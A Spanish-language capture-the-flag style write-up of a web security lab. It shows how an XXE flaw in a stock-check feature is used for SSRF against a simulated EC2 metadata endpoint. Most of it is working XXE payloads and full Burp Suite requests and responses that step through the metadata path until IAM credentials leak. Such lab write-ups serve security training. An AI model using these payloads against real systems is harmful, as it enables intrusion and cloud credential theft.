# 👺 Laboratorio: Explotación de XXE para realizar ataques SSRF

Esta práctica de laboratorio tiene una función "Verificar stock" que analiza la entrada XML y devuelve cualquier valor inesperado en la respuesta.

El servidor de laboratorio ejecuta un punto final de metadatos EC2 (simulado) en la URL predeterminada, que es http://169.254.169.254/. Este punto final se puede utilizar para recuperar datos sobre la instancia, algunos de los cuales pueden ser confidenciales.

Para resolver la práctica de laboratorio, aproveche la vulnerabilidad XXE para realizar un ataque SSRF que obtenga la clave de acceso secreta de IAM del servidor desde el punto final de metadatos EC2.



RESOLUCIÓN:

BINGO SE TENZO; CON NUESTRA ENTIDAD APROVECHANDONOS DE UN SSRF PAREALIZANDO SOLICITUDES DE CONFIANZA ENTRE SERVIDORES DE LA MISMA INFRAESTRUCTURA; Y EN BASE AL ERROR QUE NOS IVA RESPONDIENDO CON NUESTRA ENTIDAD EXTERNA COMO PAYLOAD; PUENTEAMOS LA COMUNICACION CON ESTE OTRO SERVIDOR Y A TRAVZ DEL ERROR REPORTADO POR LA FUNCION NOS FUE DANDO LOS DIRECTORIOS DE LA RUTA URL HASTA LLEGAR A COMPLETARLA PASO A PASO Y LLEGAR ALAS CREDENCIALES SECRETAS DE IAM Y ADMIN.

```python
// pyth

------------------

SCRIPT PAYLOAD ENTIDAD EXTERNA SSRF:




<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/"> ]>





PAYLOAD YA COMPLETO:




<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck> 





------------------

BURPSUITE:





REQUEST NORMAL:


POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>



RESPONSE NORMAL:


HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

925


----------


BURPSUITE DEDUCIENDO LA RUTA QUE NOS VA DEVOLVIENDO EN EL ERROR EL SERVIDOR:





REQUEST CON PAYLOAD:



POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 193
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck>




RESPONSE CON PAYLOAD:


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 31

"Invalid product ID: latest"



-------





REQUEST CON PAYLOAD:


POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 193
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck>



RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 31

"Invalid product ID: meta-data"



-----






REQUEST CON PAYLOAD:


POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 202
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck



RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 25

"Invalid product ID: iam"



-------





REQUEST CON PAYLOAD:


POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 206
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck>



RESPONSE CON PAYLOAD:


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 42

"Invalid product ID: security-credentials"


------





REQUEST CON PAYLOAD:



POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 227
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck>



RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 27

"Invalid product ID: admin"



-------






REQUEST CON PAYLOAD:




POST /product/stock HTTP/2
Host: 0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Cookie: session=LEIWIY8cNywbKO0BrI58rRtUzFLortA7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 233
Origin: https://0a0c00f80348cdf5810c7a2100a300f8.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY P4IM0Nxxe_ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>&P4IM0Nxxe_ssrf;</productId><storeId>
1
</storeId></stockCheck>




RESPONSE CON PAYLOAD:



HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 552

"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2024-03-29T20:50:56.220363549Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "GoBEiUohWXpW2L0xHa5U",
  "SecretAccessKey" : "ttsREvFFo2ZamrniOPxWBCJTAofmTESOBxU3KWSY",
  "Token" : "11uoEoGUjQL9Xlt9OjDEJLT7GlD2t8SBJLnGW39XqcFyCPAzrFo5kC0HGPzKfYOqJ5zldCv1UIU0NJdLlxnmXjofI2EEXzva6xZiEOAaB06SSseuTDKopqQGikOLjmX5xpemzAGyDh0wmn3UqtR46W7ODMTcVECPnywptjD0qPASrr5jtL8DcHozmFLJyDcBCKvM76vw9QSE7sinLYAsCvvProG9wPOF5zG7fVE6pLxq2ViuXKNNvGLrqWh6aIhy",
  "Expiration" : "2030-03-28T20:50:56.220363549Z"
}"

```

